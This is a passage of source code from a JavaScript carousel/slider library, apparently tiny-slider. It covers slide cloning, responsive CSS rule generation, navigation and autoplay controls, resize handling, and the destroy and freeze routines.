        newContainerClasses += PERCENTAGELAYOUT || autoWidth ? ' tns-subpixel' : ' tns-no-subpixel';
        newContainerClasses += CALC ? ' tns-calc' : ' tns-no-calc';
        if (autoWidth) { newContainerClasses += ' tns-autowidth'; }
        newContainerClasses += ' tns-' + options.axis;
        container.className += newContainerClasses;
    
        // add constrain layer for carousel
        if (carousel) {
          middleWrapper = doc.createElement('div');
          middleWrapper.id = slideId + '-mw';
          middleWrapper.className = 'tns-ovh';
    
          outerWrapper.appendChild(middleWrapper);
          middleWrapper.appendChild(innerWrapper);
        } else {
          outerWrapper.appendChild(innerWrapper);
        }
    
        if (autoHeight) {
          var wp = middleWrapper ? middleWrapper : innerWrapper;
          wp.className += ' tns-ah';
        }
    
        containerParent.insertBefore(outerWrapper, container);
        innerWrapper.appendChild(container);
    
        // add id, class, aria attributes
        // before clone slides
        forEach(slideItems, function(item, i) {
          addClass(item, 'tns-item');
          if (!item.id) { item.id = slideId + '-item' + i; }
          if (!carousel && animateNormal) { addClass(item, animateNormal); }
          setAttrs(item, {
            'aria-hidden': 'true',
            'tabindex': '-1'
          });
        });
    
        // ## clone slides
        // carousel: n + slides + n
        // gallery:      slides + n
        if (cloneCount) {
          var fragmentBefore = doc.createDocumentFragment(),
              fragmentAfter = doc.createDocumentFragment();
    
          for (var j = cloneCount; j--;) {
            var num = j%slideCount,
                cloneFirst = slideItems[num].cloneNode(true);
            addClass(cloneFirst, slideClonedClass);
            removeAttrs(cloneFirst, 'id');
            fragmentAfter.insertBefore(cloneFirst, fragmentAfter.firstChild);
    
            if (carousel) {
              var cloneLast = slideItems[slideCount - 1 - num].cloneNode(true);
              addClass(cloneLast, slideClonedClass);
              removeAttrs(cloneLast, 'id');
              fragmentBefore.appendChild(cloneLast);
            }
          }
    
          container.insertBefore(fragmentBefore, container.firstChild);
          container.appendChild(fragmentAfter);
          slideItems = container.children;
        }
    
      }
    
      function initSliderTransform () {
        // ## images loaded/failed
        if (hasOption('autoHeight') || autoWidth || !horizontal) {
          var imgs = container.querySelectorAll('img');
    
          // add img load event listener
          forEach(imgs, function(img) {
            var src = img.src;
    
            if (!lazyload) {
              // not data img
              if (src && src.indexOf('data:image') < 0) {
                img.src = '';
                addEvents(img, imgEvents);
                addClass(img, 'loading');
    
                img.src = src;
              // data img
              } else {
                imgLoaded(img);
              }
            }
          });
    
          // set imgsComplete
          raf(function(){ imgsLoadedCheck(arrayFromNodeList(imgs), function() { imgsComplete = true; }); });
    
          // reset imgs for auto height: check visible imgs only
          if (hasOption('autoHeight')) { imgs = getImageArray(index, Math.min(index + items - 1, slideCountNew - 1)); }
    
          lazyload ? initSliderTransformStyleCheck() : raf(function(){ imgsLoadedCheck(arrayFromNodeList(imgs), initSliderTransformStyleCheck); });
    
        } else {
          // set container transform property
          if (carousel) { doContainerTransformSilent(); }
    
          // update slider tools and events
          initTools();
          initEvents();
        }
      }
    
      function initSliderTransformStyleCheck () {
        if (autoWidth && slideCount > 1) {
          // check styles application
          var num = loop ? index : slideCount - 1;
    
          (function stylesApplicationCheck() {
            var left = slideItems[num].getBoundingClientRect().left;
            var right = slideItems[num - 1].getBoundingClientRect().right;
    
            (Math.abs(left - right) <= 1) ?
              initSliderTransformCore() :
              setTimeout(function(){ stylesApplicationCheck(); }, 16);
          })();
    
        } else {
          initSliderTransformCore();
        }
      }
    
    
      function initSliderTransformCore () {
        // run Fn()s which are rely on image loading
        if (!horizontal || autoWidth) {
          setSlidePositions();
    
          if (autoWidth) {
            rightBoundary = getRightBoundary();
            if (freezable) { freeze = getFreeze(); }
            indexMax = getIndexMax(); // <= slidePositions, rightBoundary <=
            resetVariblesWhenDisable(disable || freeze);
          } else {
            updateContentWrapperHeight();
          }
        }
    
        // set container transform property
        if (carousel) { doContainerTransformSilent(); }
    
        // update slider tools and events
        initTools();
        initEvents();
      }
    
      function initSheet () {
        // gallery:
        // set animation classes and left value for gallery slider
        if (!carousel) {
          for (var i = index, l = index + Math.min(slideCount, items); i < l; i++) {
            var item = slideItems[i];
            item.style.left = (i - index) * 100 / items + '%';
            addClass(item, animateIn);
            removeClass(item, animateNormal);
          }
        }
    
        // #### LAYOUT
    
        // ## INLINE-BLOCK VS FLOAT
    
        // ## PercentageLayout:
        // slides: inline-block
        // remove blank space between slides by set font-size: 0
    
        // ## Non PercentageLayout:
        // slides: float
        //         margin-right: -100%
        //         margin-left: ~
    
        // Resource: https://docs.google.com/spreadsheets/d/147up245wwTXeQYve3BRSAD4oVcvQmuGsFteJOeA5xNQ/edit?usp=sharing
        if (horizontal) {
          if (PERCENTAGELAYOUT || autoWidth) {
            addCSSRule(sheet, '#' + slideId + ' > .tns-item', 'font-size:' + win.getComputedStyle(slideItems[0]).fontSize + ';', getCssRulesLength(sheet));
            addCSSRule(sheet, '#' + slideId, 'font-size:0;', getCssRulesLength(sheet));
          } else if (carousel) {
            forEach(slideItems, function (slide, i) {
              slide.style.marginLeft = getSlideMarginLeft(i);
            });
          }
        }
    
    
        // ## BASIC STYLES
        if (CSSMQ) {
          // middle wrapper style
          if (TRANSITIONDURATION) {
            var str = middleWrapper && options.autoHeight ? getTransitionDurationStyle(options.speed) : '';
            addCSSRule(sheet, '#' + slideId + '-mw', str, getCssRulesLength(sheet));
          }
    
          // inner wrapper styles
          str = getInnerWrapperStyles(options.edgePadding, options.gutter, options.fixedWidth, options.speed, options.autoHeight);
          addCSSRule(sheet, '#' + slideId + '-iw', str, getCssRulesLength(sheet));
    
          // container styles
          if (carousel) {
            str = horizontal && !autoWidth ? 'width:' + getContainerWidth(options.fixedWidth, options.gutter, options.items) + ';' : '';
            if (TRANSITIONDURATION) { str += getTransitionDurationStyle(speed); }
            addCSSRule(sheet, '#' + slideId, str, getCssRulesLength(sheet));
          }
    
          // slide styles
          str = horizontal && !autoWidth ? getSlideWidthStyle(options.fixedWidth, options.gutter, options.items) : '';
          if (options.gutter) { str += getSlideGutterStyle(options.gutter); }
          // set gallery items transition-duration
          if (!carousel) {
            if (TRANSITIONDURATION) { str += getTransitionDurationStyle(speed); }
            if (ANIMATIONDURATION) { str += getAnimationDurationStyle(speed); }
          }
          if (str) { addCSSRule(sheet, '#' + slideId + ' > .tns-item', str, getCssRulesLength(sheet)); }
    
        // non CSS mediaqueries: IE8
        // ## update inner wrapper, container, slides if needed
        // set inline styles for inner wrapper & container
        // insert stylesheet (one line) for slides only (since slides are many)
        } else {
          // middle wrapper styles
          update_carousel_transition_duration();
    
          // inner wrapper styles
          innerWrapper.style.cssText = getInnerWrapperStyles(edgePadding, gutter, fixedWidth, autoHeight);
    
          // container styles
          if (carousel && horizontal && !autoWidth) {
            container.style.width = getContainerWidth(fixedWidth, gutter, items);
          }
    
          // slide styles
          var str = horizontal && !autoWidth ? getSlideWidthStyle(fixedWidth, gutter, items) : '';
          if (gutter) { str += getSlideGutterStyle(gutter); }
    
          // append to the last line
          if (str) { addCSSRule(sheet, '#' + slideId + ' > .tns-item', str, getCssRulesLength(sheet)); }
        }
    
        // ## MEDIAQUERIES
        if (responsive && CSSMQ) {
          for (var bp in responsive) {
            // bp: convert string to number
            bp = parseInt(bp);
    
            var opts = responsive[bp],
                str = '',
                middleWrapperStr = '',
                innerWrapperStr = '',
                containerStr = '',
                slideStr = '',
                itemsBP = !autoWidth ? getOption('items', bp) : null,
                fixedWidthBP = getOption('fixedWidth', bp),
                speedBP = getOption('speed', bp),
                edgePaddingBP = getOption('edgePadding', bp),
                autoHeightBP = getOption('autoHeight', bp),
                gutterBP = getOption('gutter', bp);
    
            // middle wrapper string
            if (TRANSITIONDURATION && middleWrapper && getOption('autoHeight', bp) && 'speed' in opts) {
              middleWrapperStr = '#' + slideId + '-mw{' + getTransitionDurationStyle(speedBP) + '}';
            }
    
            // inner wrapper string
            if ('edgePadding' in opts || 'gutter' in opts) {
              innerWrapperStr = '#' + slideId + '-iw{' + getInnerWrapperStyles(edgePaddingBP, gutterBP, fixedWidthBP, speedBP, autoHeightBP) + '}';
            }
    
            // container string
            if (carousel && horizontal && !autoWidth && ('fixedWidth' in opts || 'items' in opts || (fixedWidth && 'gutter' in opts))) {
              containerStr = 'width:' + getContainerWidth(fixedWidthBP, gutterBP, itemsBP) + ';';
            }
            if (TRANSITIONDURATION && 'speed' in opts) {
              containerStr += getTransitionDurationStyle(speedBP);
            }
            if (containerStr) {
              containerStr = '#' + slideId + '{' + containerStr + '}';
            }
    
            // slide string
            if ('fixedWidth' in opts || (fixedWidth && 'gutter' in opts) || !carousel && 'items' in opts) {
              slideStr += getSlideWidthStyle(fixedWidthBP, gutterBP, itemsBP);
            }
            if ('gutter' in opts) {
              slideStr += getSlideGutterStyle(gutterBP);
            }
            // set gallery items transition-duration
            if (!carousel && 'speed' in opts) {
              if (TRANSITIONDURATION) { slideStr += getTransitionDurationStyle(speedBP); }
              if (ANIMATIONDURATION) { slideStr += getAnimationDurationStyle(speedBP); }
            }
            if (slideStr) { slideStr = '#' + slideId + ' > .tns-item{' + slideStr + '}'; }
    
            // add up
            str = middleWrapperStr + innerWrapperStr + containerStr + slideStr;
    
            if (str) {
              sheet.insertRule('@media (min-width: ' + bp / 16 + 'em) {' + str + '}', sheet.cssRules.length);
            }
          }
        }
      }
    
      function initTools () {
        // == slides ==
        updateSlideStatus();
    
        // == live region ==
        outerWrapper.insertAdjacentHTML('afterbegin', '<div class="tns-liveregion tns-visually-hidden" aria-live="polite" aria-atomic="true">slide <span class="current">' + getLiveRegionStr() + '</span>  of ' + slideCount + '</div>');
        liveregionCurrent = outerWrapper.querySelector('.tns-liveregion .current');
    
        // == autoplayInit ==
        if (hasAutoplay) {
          var txt = autoplay ? 'stop' : 'start';
          if (autoplayButton) {
            setAttrs(autoplayButton, {'data-action': txt});
          } else if (options.autoplayButtonOutput) {
            outerWrapper.insertAdjacentHTML(getInsertPosition(options.autoplayPosition), '<button type="button" data-action="' + txt + '">' + autoplayHtmlStrings[0] + txt + autoplayHtmlStrings[1] + autoplayText[0] + '</button>');
            autoplayButton = outerWrapper.querySelector('[data-action]');
          }
    
          // add event
          if (autoplayButton) {
            addEvents(autoplayButton, {'click': toggleAutoplay});
          }
    
          if (autoplay) {
            startAutoplay();
            if (autoplayHoverPause) { addEvents(container, hoverEvents); }
            if (autoplayResetOnVisibility) { addEvents(container, visibilityEvent); }
          }
        }
    
        // == navInit ==
        if (hasNav) {
          var initIndex = !carousel ? 0 : cloneCount;
          // customized nav
          // will not hide the navs in case they're thumbnails
          if (navContainer) {
            setAttrs(navContainer, {'aria-label': 'Carousel Pagination'});
            navItems = navContainer.children;
            forEach(navItems, function(item, i) {
              setAttrs(item, {
                'data-nav': i,
                'tabindex': '-1',
                'aria-label': navStr + (i + 1),
                'aria-controls': slideId,
              });
            });
    
          // generated nav
          } else {
            var navHtml = '',
                hiddenStr = navAsThumbnails ? '' : 'style="display:none"';
            for (var i = 0; i < slideCount; i++) {
              // hide nav items by default
              navHtml += '<button type="button" data-nav="' + i +'" tabindex="-1" aria-controls="' + slideId + '" ' + hiddenStr + ' aria-label="' + navStr + (i + 1) +'"></button>';
            }
            navHtml = '<div class="tns-nav" aria-label="Carousel Pagination">' + navHtml + '</div>';
            outerWrapper.insertAdjacentHTML(getInsertPosition(options.navPosition), navHtml);
    
            navContainer = outerWrapper.querySelector('.tns-nav');
            navItems = navContainer.children;
          }
    
          updateNavVisibility();
    
          // add transition
          if (TRANSITIONDURATION) {
            var prefix = TRANSITIONDURATION.substring(0, TRANSITIONDURATION.length - 18).toLowerCase(),
                str = 'transition: all ' + speed / 1000 + 's';
    
            if (prefix) {
              str = '-' + prefix + '-' + str;
            }
    
            addCSSRule(sheet, '[aria-controls^=' + slideId + '-item]', str, getCssRulesLength(sheet));
          }
    
          setAttrs(navItems[navCurrentIndex], {'aria-label': navStr + (navCurrentIndex + 1) + navStrCurrent});
          removeAttrs(navItems[navCurrentIndex], 'tabindex');
          addClass(navItems[navCurrentIndex], navActiveClass);
    
          // add events
          addEvents(navContainer, navEvents);
        }
    
    
    
        // == controlsInit ==
        if (hasControls) {
          if (!controlsContainer && (!prevButton || !nextButton)) {
            outerWrapper.insertAdjacentHTML(getInsertPosition(options.controlsPosition), '<div class="tns-controls" aria-label="Carousel Navigation" tabindex="0"><button type="button" data-controls="prev" tabindex="-1" aria-controls="' + slideId +'">' + controlsText[0] + '</button><button type="button" data-controls="next" tabindex="-1" aria-controls="' + slideId +'">' + controlsText[1] + '</button></div>');
    
            controlsContainer = outerWrapper.querySelector('.tns-controls');
          }
    
          if (!prevButton || !nextButton) {
            prevButton = controlsContainer.children[0];
            nextButton = controlsContainer.children[1];
          }
    
          if (options.controlsContainer) {
            setAttrs(controlsContainer, {
              'aria-label': 'Carousel Navigation',
              'tabindex': '0'
            });
          }
    
          if (options.controlsContainer || (options.prevButton && options.nextButton)) {
            setAttrs([prevButton, nextButton], {
              'aria-controls': slideId,
              'tabindex': '-1',
            });
          }
    
          if (options.controlsContainer || (options.prevButton && options.nextButton)) {
            setAttrs(prevButton, {'data-controls' : 'prev'});
            setAttrs(nextButton, {'data-controls' : 'next'});
          }
    
          prevIsButton = isButton(prevButton);
          nextIsButton = isButton(nextButton);
    
          updateControlsStatus();
    
          // add events
          if (controlsContainer) {
            addEvents(controlsContainer, controlsEvents);
          } else {
            addEvents(prevButton, controlsEvents);
            addEvents(nextButton, controlsEvents);
          }
        }
    
        // hide tools if needed
        disableUI();
      }
    
      function initEvents () {
        // add events
        if (carousel && TRANSITIONEND) {
          var eve = {};
          eve[TRANSITIONEND] = onTransitionEnd;
          addEvents(container, eve);
        }
    
        if (touch) { addEvents(container, touchEvents, options.preventScrollOnTouch); }
        if (mouseDrag) { addEvents(container, dragEvents); }
        if (arrowKeys) { addEvents(doc, docmentKeydownEvent); }
    
        if (nested === 'inner') {
          events.on('outerResized', function () {
            resizeTasks();
            events.emit('innerLoaded', info());
          });
        } else if (responsive || fixedWidth || autoWidth || autoHeight || !horizontal) {
          addEvents(win, {'resize': onResize});
        }
    
        if (autoHeight) {
          if (nested === 'outer') {
            events.on('innerLoaded', doAutoHeight);
          } else if (!disable) { doAutoHeight(); }
        }
    
        doLazyLoad();
        if (disable) { disableSlider(); } else if (freeze) { freezeSlider(); }
    
        events.on('indexChanged', additionalUpdates);
        if (nested === 'inner') { events.emit('innerLoaded', info()); }
        if (typeof onInit === 'function') { onInit(info()); }
        isOn = true;
      }
    
      function destroy () {
        // sheet
        sheet.disabled = true;
        if (sheet.ownerNode) { sheet.ownerNode.remove(); }
    
        // remove win event listeners
        removeEvents(win, {'resize': onResize});
    
        // arrowKeys, controls, nav
        if (arrowKeys) { removeEvents(doc, docmentKeydownEvent); }
        if (controlsContainer) { removeEvents(controlsContainer, controlsEvents); }
        if (navContainer) { removeEvents(navContainer, navEvents); }
    
        // autoplay
        removeEvents(container, hoverEvents);
        removeEvents(container, visibilityEvent);
        if (autoplayButton) { removeEvents(autoplayButton, {'click': toggleAutoplay}); }
        if (autoplay) { clearInterval(autoplayTimer); }
    
        // container
        if (carousel && TRANSITIONEND) {
          var eve = {};
          eve[TRANSITIONEND] = onTransitionEnd;
          removeEvents(container, eve);
        }
        if (touch) { removeEvents(container, touchEvents); }
        if (mouseDrag) { removeEvents(container, dragEvents); }
    
        // cache Object values in options && reset HTML
        var htmlList = [containerHTML, controlsContainerHTML, prevButtonHTML, nextButtonHTML, navContainerHTML, autoplayButtonHTML];
    
        tnsList.forEach(function(item, i) {
          var el = item === 'container' ? outerWrapper : options[item];
    
          if (typeof el === 'object' && el) {
            var prevEl = el.previousElementSibling ? el.previousElementSibling : false,
                parentEl = el.parentNode;
            el.outerHTML = htmlList[i];
            options[item] = prevEl ? prevEl.nextElementSibling : parentEl.firstElementChild;
          }
        });
    
    
        // reset variables
        tnsList = animateIn = animateOut = animateDelay = animateNormal = horizontal = outerWrapper = innerWrapper = container = containerParent = containerHTML = slideItems = slideCount = breakpointZone = windowWidth = autoWidth = fixedWidth = edgePadding = gutter = viewport = items = slideBy = viewportMax = arrowKeys = speed = rewind = loop = autoHeight = sheet = lazyload = slidePositions = slideItemsOut = cloneCount = slideCountNew = hasRightDeadZone = rightBoundary = updateIndexBeforeTransform = transformAttr = transformPrefix = transformPostfix = getIndexMax = index = indexCached = indexMin = indexMax = resizeTimer = swipeAngle = moveDirectionExpected = running = onInit = events = newContainerClasses = slideId = disable = disabled = freezable = freeze = frozen = controlsEvents = navEvents = hoverEvents = visibilityEvent = docmentKeydownEvent = touchEvents = dragEvents = hasControls = hasNav = navAsThumbnails = hasAutoplay = hasTouch = hasMouseDrag = slideActiveClass = imgCompleteClass = imgEvents = imgsComplete = controls = controlsText = controlsContainer = controlsContainerHTML = prevButton = nextButton = prevIsButton = nextIsButton = nav = navContainer = navContainerHTML = navItems = pages = pagesCached = navClicked = navCurrentIndex = navCurrentIndexCached = navActiveClass = navStr = navStrCurrent = autoplay = autoplayTimeout = autoplayDirection = autoplayText = autoplayHoverPause = autoplayButton = autoplayButtonHTML = autoplayResetOnVisibility = autoplayHtmlStrings = autoplayTimer = animating = autoplayHoverPaused = autoplayUserPaused = autoplayVisibilityPaused = initPosition = lastPosition = translateInit = disX = disY = panStart = rafIndex = getDist = touch = mouseDrag = null;
        // check variables
        // [animateIn, animateOut, animateDelay, animateNormal, horizontal, outerWrapper, innerWrapper, container, containerParent, containerHTML, slideItems, slideCount, breakpointZone, windowWidth, autoWidth, fixedWidth, edgePadding, gutter, viewport, items, slideBy, viewportMax, arrowKeys, speed, rewind, loop, autoHeight, sheet, lazyload, slidePositions, slideItemsOut, cloneCount, slideCountNew, hasRightDeadZone, rightBoundary, updateIndexBeforeTransform, transformAttr, transformPrefix, transformPostfix, getIndexMax, index, indexCached, indexMin, indexMax, resizeTimer, swipeAngle, moveDirectionExpected, running, onInit, events, newContainerClasses, slideId, disable, disabled, freezable, freeze, frozen, controlsEvents, navEvents, hoverEvents, visibilityEvent, docmentKeydownEvent, touchEvents, dragEvents, hasControls, hasNav, navAsThumbnails, hasAutoplay, hasTouch, hasMouseDrag, slideActiveClass, imgCompleteClass, imgEvents, imgsComplete, controls, controlsText, controlsContainer, controlsContainerHTML, prevButton, nextButton, prevIsButton, nextIsButton, nav, navContainer, navContainerHTML, navItems, pages, pagesCached, navClicked, navCurrentIndex, navCurrentIndexCached, navActiveClass, navStr, navStrCurrent, autoplay, autoplayTimeout, autoplayDirection, autoplayText, autoplayHoverPause, autoplayButton, autoplayButtonHTML, autoplayResetOnVisibility, autoplayHtmlStrings, autoplayTimer, animating, autoplayHoverPaused, autoplayUserPaused, autoplayVisibilityPaused, initPosition, lastPosition, translateInit, disX, disY, panStart, rafIndex, getDist, touch, mouseDrag ].forEach(function(item) { if (item !== null) { console.log(item); } });
    
        for (var a in this) {
          if (a !== 'rebuild') { this[a] = null; }
        }
        isOn = false;
      }
    
    // === ON RESIZE ===
      // responsive || fixedWidth || autoWidth || !horizontal
      function onResize (e) {
        raf(function(){ resizeTasks(getEvent(e)); });
      }
    
      function resizeTasks (e) {
        if (!isOn) { return; }
        if (nested === 'outer') { events.emit('outerResized', info(e)); }
        windowWidth = getWindowWidth();
        var bpChanged,
            breakpointZoneTem = breakpointZone,
            needContainerTransform = false;
    
        if (responsive) {
          setBreakpointZone();
          bpChanged = breakpointZoneTem !== breakpointZone;
          // if (hasRightDeadZone) { needContainerTransform = true; } // *?
          if (bpChanged) { events.emit('newBreakpointStart', info(e)); }
        }
    
        var indChanged,
            itemsChanged,
            itemsTem = items,
            disableTem = disable,
            freezeTem = freeze,
            arrowKeysTem = arrowKeys,
            controlsTem = controls,
            navTem = nav,
            touchTem = touch,
            mouseDragTem = mouseDrag,
            autoplayTem = autoplay,
            autoplayHoverPauseTem = autoplayHoverPause,
            autoplayResetOnVisibilityTem = autoplayResetOnVisibility,
            indexTem = index;
    
        if (bpChanged) {
          var fixedWidthTem = fixedWidth,
              autoHeightTem = autoHeight,
              controlsTextTem = controlsText,
              centerTem = center,
              autoplayTextTem = autoplayText;
    
          if (!CSSMQ) {
            var gutterTem = gutter,
                edgePaddingTem = edgePadding;
          }
        }
    
        // get option:
        // fixed width: viewport, fixedWidth, gutter => items
        // others: window width => all variables
        // all: items => slideBy
        arrowKeys = getOption('arrowKeys');
        controls = getOption('controls');
        nav = getOption('nav');
        touch = getOption('touch');
        center = getOption('center');
        mouseDrag = getOption('mouseDrag');
        autoplay = getOption('autoplay');
        autoplayHoverPause = getOption('autoplayHoverPause');
        autoplayResetOnVisibility = getOption('autoplayResetOnVisibility');
    
        if (bpChanged) {
          disable = getOption('disable');
          fixedWidth = getOption('fixedWidth');
          speed = getOption('speed');
          autoHeight = getOption('autoHeight');
          controlsText = getOption('controlsText');
          autoplayText = getOption('autoplayText');
          autoplayTimeout = getOption('autoplayTimeout');
    
          if (!CSSMQ) {
            edgePadding = getOption('edgePadding');
            gutter = getOption('gutter');
          }
        }
        // update options
        resetVariblesWhenDisable(disable);
    
        viewport = getViewportWidth(); // <= edgePadding, gutter
        if ((!horizontal || autoWidth) && !disable) {
          setSlidePositions();
          if (!horizontal) {
            updateContentWrapperHeight(); // <= setSlidePositions
            needContainerTransform = true;
          }
        }
        if (fixedWidth || autoWidth) {
          rightBoundary = getRightBoundary(); // autoWidth: <= viewport, slidePositions, gutter
                                              // fixedWidth: <= viewport, fixedWidth, gutter
          indexMax = getIndexMax(); // autoWidth: <= rightBoundary, slidePositions
                                    // fixedWidth: <= rightBoundary, fixedWidth, gutter
        }
    
        if (bpChanged || fixedWidth) {
          items = getOption('items');
          slideBy = getOption('slideBy');
          itemsChanged = items !== itemsTem;
    
          if (itemsChanged) {
            if (!fixedWidth && !autoWidth) { indexMax = getIndexMax(); } // <= items
            // check index before transform in case
            // slider reach the right edge then items become bigger
            updateIndex();
          }
        }
    
        if (bpChanged) {
          if (disable !== disableTem) {
            if (disable) {
              disableSlider();
            } else {
              enableSlider(); // <= slidePositions, rightBoundary, indexMax
            }
          }
        }
    
        if (freezable && (bpChanged || fixedWidth || autoWidth)) {
          freeze = getFreeze(); // <= autoWidth: slidePositions, gutter, viewport, rightBoundary
                                // <= fixedWidth: fixedWidth, gutter, rightBoundary
                                // <= others: items
    
          if (freeze !== freezeTem) {
            if (freeze) {
              doContainerTransform(getContainerTransformValue(getStartIndex(0)));
              freezeSlider();
            } else {
              unfreezeSlider();
              needContainerTransform = true;
            }
          }
        }
    
        resetVariblesWhenDisable(disable || freeze); // controls, nav, touch, mouseDrag, arrowKeys, autoplay, autoplayHoverPause, autoplayResetOnVisibility
        if (!autoplay) { autoplayHoverPause = autoplayResetOnVisibility = false; }
    
        if (arrowKeys !== arrowKeysTem) {
          arrowKeys ?
            addEvents(doc, docmentKeydownEvent) :
            removeEvents(doc, docmentKeydownEvent);
        }
        if (controls !== controlsTem) {
          if (controls) {
            if (controlsContainer) {
              showElement(controlsContainer);
            } else {
              if (prevButton) { showElement(prevButton); }
              if (nextButton) { showElement(nextButton); }
            }
          } else {
            if (controlsContainer) {
              hideElement(controlsContainer);
            } else {
              if (prevButton) { hideElement(prevButton); }
              if (nextButton) { hideElement(nextButton); }
            }
          }
        }
        if (nav !== navTem) {
          if (nav) {
            showElement(navContainer);
            updateNavVisibility();
          } else {
            hideElement(navContainer);
          }
        }
        if (touch !== touchTem) {
          touch ?
            addEvents(container, touchEvents, options.preventScrollOnTouch) :
            removeEvents(container, touchEvents);
        }
        if (mouseDrag !== mouseDragTem) {
          mouseDrag ?
            addEvents(container, dragEvents) :
            removeEvents(container, dragEvents);
        }
        if (autoplay !== autoplayTem) {
          if (autoplay) {
            if (autoplayButton) { showElement(autoplayButton); }
            if (!animating && !autoplayUserPaused) { startAutoplay(); }
          } else {
            if (autoplayButton) { hideElement(autoplayButton); }
            if (animating) { stopAutoplay(); }
          }
        }
        if (autoplayHoverPause !== autoplayHoverPauseTem) {
          autoplayHoverPause ?
            addEvents(container, hoverEvents) :
            removeEvents(container, hoverEvents);
        }
        if (autoplayResetOnVisibility !== autoplayResetOnVisibilityTem) {
          autoplayResetOnVisibility ?
            addEvents(doc, visibilityEvent) :
            removeEvents(doc, visibilityEvent);
        }
    
        if (bpChanged) {
          if (fixedWidth !== fixedWidthTem || center !== centerTem) { needContainerTransform = true; }
    
          if (autoHeight !== autoHeightTem) {
            if (!autoHeight) { innerWrapper.style.height = ''; }
          }
    
          if (controls && controlsText !== controlsTextTem) {
            prevButton.innerHTML = controlsText[0];
            nextButton.innerHTML = controlsText[1];
          }
    
          if (autoplayButton && autoplayText !== autoplayTextTem) {
            var i = autoplay ? 1 : 0,
                html = autoplayButton.innerHTML,
                len = html.length - autoplayTextTem[i].length;
            if (html.substring(len) === autoplayTextTem[i]) {
              autoplayButton.innerHTML = html.substring(0, len) + autoplayText[i];
            }
          }
        } else {
          if (center && (fixedWidth || autoWidth)) { needContainerTransform = true; }
        }
    
        if (itemsChanged || fixedWidth && !autoWidth) {
          pages = getPages();
          updateNavVisibility();
        }
    
        indChanged = index !== indexTem;
        if (indChanged) {
          events.emit('indexChanged', info());
          needContainerTransform = true;
        } else if (itemsChanged) {
          if (!indChanged) { additionalUpdates(); }
        } else if (fixedWidth || autoWidth) {
          doLazyLoad();
          updateSlideStatus();
          updateLiveRegion();
        }
    
        if (itemsChanged && !carousel) { updateGallerySlidePositions(); }
    
        if (!disable && !freeze) {
          // non-mediaqueries: IE8
          if (bpChanged && !CSSMQ) {
            // middle wrapper styles
    
            // inner wrapper styles
            if (edgePadding !== edgePaddingTem || gutter !== gutterTem) {
              innerWrapper.style.cssText = getInnerWrapperStyles(edgePadding, gutter, fixedWidth, speed, autoHeight);
            }
    
            if (horizontal) {
              // container styles
              if (carousel) {
                container.style.width = getContainerWidth(fixedWidth, gutter, items);
              }
    
              // slide styles
              var str = getSlideWidthStyle(fixedWidth, gutter, items) +
                        getSlideGutterStyle(gutter);
    
              // remove the last line and
              // add new styles
              removeCSSRule(sheet, getCssRulesLength(sheet) - 1);
              addCSSRule(sheet, '#' + slideId + ' > .tns-item', str, getCssRulesLength(sheet));
            }
          }
    
          // auto height
          if (autoHeight) { doAutoHeight(); }
    
          if (needContainerTransform) {
            doContainerTransformSilent();
            indexCached = index;
          }
        }
    
        if (bpChanged) { events.emit('newBreakpointEnd', info(e)); }
      }
    
    
    
    
    
      // === INITIALIZATION FUNCTIONS === //
      function getFreeze () {
        if (!fixedWidth && !autoWidth) {
          var a = center ? items - (items - 1) / 2 : items;
          return  slideCount <= a;
        }
    
        var width = fixedWidth ? (fixedWidth + gutter) * slideCount : slidePositions[slideCount],
            vp = edgePadding ? viewport + edgePadding * 2 : viewport + gutter;
    
        if (center) {
          vp -= fixedWidth ? (viewport - fixedWidth) / 2 : (viewport - (slidePositions[index + 1] - slidePositions[index] - gutter)) / 2;
        }
    
        return width <= vp;
      }
    
      function setBreakpointZone () {
        breakpointZone = 0;
        for (var bp in responsive) {
          bp = parseInt(bp); // convert string to number
          if (windowWidth >= bp) { breakpointZone = bp; }
        }
      }
    
      // (slideBy, indexMin, indexMax) => index
      var updateIndex = (function () {
        return loop ?
          carousel ?
            // loop + carousel
            function () {
              var leftEdge = indexMin,
                  rightEdge = indexMax;
    
              leftEdge += slideBy;
              rightEdge -= slideBy;
    
              // adjust edges when has edge paddings
              // or fixed-width slider with extra space on the right side
              if (edgePadding) {
                leftEdge += 1;
                rightEdge -= 1;
              } else if (fixedWidth) {
                if ((viewport + gutter)%(fixedWidth + gutter)) { rightEdge -= 1; }
              }
    
              if (cloneCount) {
                if (index > rightEdge) {
                  index -= slideCount;
                } else if (index < leftEdge) {
                  index += slideCount;
                }
              }
            } :
            // loop + gallery
            function() {
              if (index > indexMax) {
                while (index >= indexMin + slideCount) { index -= slideCount; }
              } else if (index < indexMin) {
                while (index <= indexMax - slideCount) { index += slideCount; }
              }
            } :
          // non-loop
          function() {
            index = Math.max(indexMin, Math.min(indexMax, index));
          };
      })();
    
      function disableUI () {
        if (!autoplay && autoplayButton) { hideElement(autoplayButton); }
        if (!nav && navContainer) { hideElement(navContainer); }
        if (!controls) {
          if (controlsContainer) {
            hideElement(controlsContainer);
          } else {
            if (prevButton) { hideElement(prevButton); }
            if (nextButton) { hideElement(nextButton); }
          }
        }
      }
    
      function enableUI () {
        if (autoplay && autoplayButton) { showElement(autoplayButton); }
        if (nav && navContainer) { showElement(navContainer); }
        if (controls) {
          if (controlsContainer) {
            showElement(controlsContainer);
          } else {
            if (prevButton) { showElement(prevButton); }
            if (nextButton) { showElement(nextButton); }
          }
        }
      }
    
      function freezeSlider () {
        if (frozen) { return; }
    
        // remove edge padding from inner wrapper
        if (edgePadding) { innerWrapper.style.margin = '0px'; }
    
        // add class tns-transparent to cloned slides
        if (cloneCount) {
          var str = 'tns-transparent';
          for (var i = cloneCount; i--;) {
            if (carousel) { addClass(slideItems[i], str); }
            addClass(slideItems[slideCountNew - i - 1], str);
          }
        }
    
        // update tools
        disableUI();
    
        frozen = true;
      }
    
      function unfreezeSlider () {
        if (!frozen) { return; }
    
        // restore edge padding for inner wrapper
        // for mordern browsers
        if (edgePadding && CSSMQ) { innerWrapper.style.margin = ''; }
    
        // remove class tns-transparent to cloned slides
        if (cloneCount) {
          var str = 'tns-transparent';
          for (var i = cloneCount; i--;) {
            if (carousel) { removeClass(slideItems[i], str); }
            removeClass(slideItems[slideCountNew - i - 1], str);
          }
        }
    
        // update tools
        enableUI();
    
        frozen = false;
      }
    
      function disableSlider () {
        if (disabled) { return; }
    
        sheet.disabled = true;
        container.className = container.className.replace(newContainerClasses.substring(1), '');
        removeAttrs(container, ['style']);
        if (loop) {
          for (var j = cloneCount; j--;) {
            if (carousel) { hideElement(slideItems[j]); }
